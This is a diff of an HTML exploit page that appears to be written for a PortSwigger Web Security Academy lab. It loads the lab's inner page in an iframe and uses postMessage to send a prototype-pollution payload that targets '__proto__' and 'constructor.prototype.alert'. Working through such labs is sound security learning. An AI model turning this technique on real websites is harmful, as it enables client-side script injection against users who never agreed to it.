@@ -1,20 +1,27 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Exploit</title>
+    <title>PostMessage Exploit</title>
 </head>
 <body>
     <h1>PostMessage Exploit - Loading...</h1>
-
-    <iframe id="target" src="https://0a1200680479a300806f03dd00b400b0.web-security-academy.net/inner.html" width="900" height="600"></iframe>
+    
+    <iframe id="target" 
+            src="https://0a1200680479a300806f03dd00b400b0.web-security-academy.net/inner.html" 
+            width="1000" 
+            height="700">
+    </iframe>
 
     <script>
         const iframe = document.getElementById('target');
 
         iframe.onload = function() {
-            console.log("Iframe loaded, sending payload in 1 second...");
+            console.log("[+] Iframe loaded");
 
+            // Delay lebih lama agar inner.js stabil
             setTimeout(() => {
+                console.log("[+] Sending Prototype Pollution payload...");
+
                 iframe.contentWindow.postMessage({
                     base: {
                         reqBody: {}
@@ -24,18 +31,18 @@
                     },
                     mappings: [
                         {
-                            from: "__proto__.alert",           // Prototype Pollution
-                            to: "test"
+                            from: "__proto__.xss",           // Simple pollution test
+                            to: "polluted"
                         },
                         {
                             from: "constructor.prototype.alert",
-                            to: "test2"
+                            to: "alertFunc"
                         }
                     ]
                 }, "*");
 
-                console.log("Payload sent!");
-            }, 1500); // Delay 1.5 detik
+                console.log("[+] Payload sent!");
+            }, 2000); // 2 detik delay
         };
     </script>
 </body>
